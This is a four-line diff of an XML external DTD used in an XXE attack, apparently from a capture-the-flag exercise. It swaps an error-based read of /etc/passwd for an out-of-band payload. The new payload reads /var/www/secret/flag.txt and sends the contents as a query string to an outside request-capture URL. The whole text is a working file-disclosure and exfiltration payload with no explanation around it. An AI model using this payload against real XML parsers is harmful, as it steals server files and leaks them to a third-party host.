@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+<!ENTITY % file SYSTEM "file:///var/www/secret/flag.txt">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'https://enub04h8dmq7.x.pipedream.net/?a=%file;'>">
 %eval;
 %error;
